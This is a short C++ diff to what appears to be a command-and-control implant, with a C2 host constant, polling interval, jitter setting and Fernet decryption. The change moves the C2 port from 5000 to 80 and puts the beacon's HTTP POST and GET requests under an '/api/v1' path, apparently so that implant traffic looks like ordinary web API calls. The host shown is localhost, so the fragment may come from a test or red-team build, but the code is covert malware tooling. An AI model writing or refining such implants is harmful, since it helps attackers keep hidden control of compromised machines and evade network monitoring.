@@ -232,7 +232,7 @@ std::string fernet_decrypt(const std::string& token_b64, const std::string& key_
 // ─────────────────────────────────────────────────────────────────────────────
 
 static const std::string C2_HOST = "127.0.0.1";
-static const int C2_PORT = 5000;
+static const int C2_PORT = 80;
 static const int POLL_SECONDS = 5;
 static const int JITTER_PERCENT = 20;
 
@@ -296,7 +296,7 @@ static std::string http_post(const std::string& path, const std::string& body) {
     if (sock < 0) return "";
 
     std::string req =
-        std::string("POST ") + path + " HTTP/1.1\r\n"
+        std::string("POST /api/v1") + path + " HTTP/1.1\r\n"
         "Host: " + C2_HOST + "\r\n"
         "Content-Type: application/octet-stream\r\n"
         "Content-Length: " + std::to_string(body.size()) + "\r\n"
@@ -313,7 +313,7 @@ static std::string http_get(const std::string& path) {
     if (sock < 0) return "";
 
     std::string req =
-        std::string("GET ") + path + " HTTP/1.1\r\n"
+        std::string("GET /api/v1") + path + " HTTP/1.1\r\n"
         "Host: " + C2_HOST + "\r\n"
         "Connection: close\r\n\r\n";
 
